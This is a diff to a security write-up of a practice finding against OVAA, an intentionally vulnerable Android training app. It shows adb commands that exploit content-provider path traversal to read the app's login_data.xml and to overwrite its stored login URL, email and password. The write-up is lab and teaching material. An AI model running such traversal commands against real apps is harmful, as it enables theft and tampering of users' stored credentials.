@@ -52,8 +52,8 @@ adb shell content read --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%
     <string name="email">...</string>
 </map>
 ```
+```bash
 adb shell content write --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml" < payload.xml
-```
 ```
 confirming attacker-supplied `login_url`, `email`, and `password` values were written in place.
 
@@ -88,7 +88,5 @@ Practice finding against the intentionally vulnerable OVAA application
 live/responsible-disclosure submission — OVAA is designed to contain this bug.Verified via:
 ```bash
 adb shell run-as oversecured.ovaa cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
-
-**Write:**
-```bash
+```
 
